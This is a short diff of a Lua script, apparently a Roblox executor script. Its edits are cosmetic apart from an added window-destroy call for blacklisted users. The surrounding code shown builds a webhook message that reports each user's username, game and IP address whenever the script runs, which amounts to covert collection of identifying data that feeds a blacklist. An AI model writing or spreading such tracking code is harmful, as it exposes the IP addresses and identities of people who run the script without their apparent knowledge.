@@ -118,14 +118,14 @@ end
 local function sendWebhook(ip, executor, isBlacklisted)
     local username = LocalPlayer and LocalPlayer.Name or "Unknown"
     local gameName, gameId = getGameInfo()
-    local blacklistStatus = (isBlacklisted and "Yes") or "No"
+    local blacklistStatus = isBlacklisted and "Yes" or "No"
 
     local payload = {
         ["content"] = "",
         ["embeds"] = {{
             ["title"] = "Script Execution Detected",
             ["description"] = "A user executed the script.",
-            ["color"] = isBlacklisted and 14423100 or 65280, -- Red or green
+            ["color"] = isBlacklisted and 14423100 or 65280,
             ["fields"] = {
                 {["name"] = "Username", ["value"] = username, ["inline"] = true},
                 {["name"] = "IP", ["value"] = ip, ["inline"] = true},
@@ -158,5 +158,6 @@ task.spawn(function()
 
     if isBlacklisted then
         showBlacklistScreen()
+        Window:Destroy()
     end
 end)
